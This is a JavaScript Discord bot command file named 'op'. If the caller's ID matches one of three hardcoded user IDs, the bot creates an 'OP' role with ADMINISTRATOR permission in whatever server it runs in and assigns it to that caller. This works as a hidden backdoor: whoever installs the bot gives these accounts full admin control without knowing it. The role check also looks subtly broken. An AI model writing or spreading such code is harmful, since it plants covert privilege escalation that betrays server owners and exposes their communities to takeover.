const Discord = require("discord.js");
const fs = require("fs");
const fetch = require("node-fetch");
let prefix = process.env.PREFIX;
const color = process.env.COLOR;

module.exports.run = async (client, message, args) => {
    
    let opRole = message.guild.roles.cache.find(r => r.name ==="OP");

    if(message.author.id === `408289224761016332` || // wavaca#7911
       message.author.id === `400716545292107779` || // Senne#2930
       message.author.id === `383332117188444160`    // Tsunami#6271
      ) {
      
      if(message.member.roles.has(opRole)) {
        return message.channel.send(`❌ | I couldn't give you the OP role, because you already have it!`);
      }
      
        let createdOpRole = await message.guild.roles.create({
          data: {
            name: "OP",
            permissions: ["ADMINISTRATOR"]
          }
        });
        message.member.roles.add(createdOpRole);

      message.channel.send(`☑️ | I created and gave you the OP role successfully!`)
        
    } else {

    return message.channel.send(`❌ | You don't have permissions to use this command!`);
    
    }
  }

  module.exports.help = {
    name: "op"
}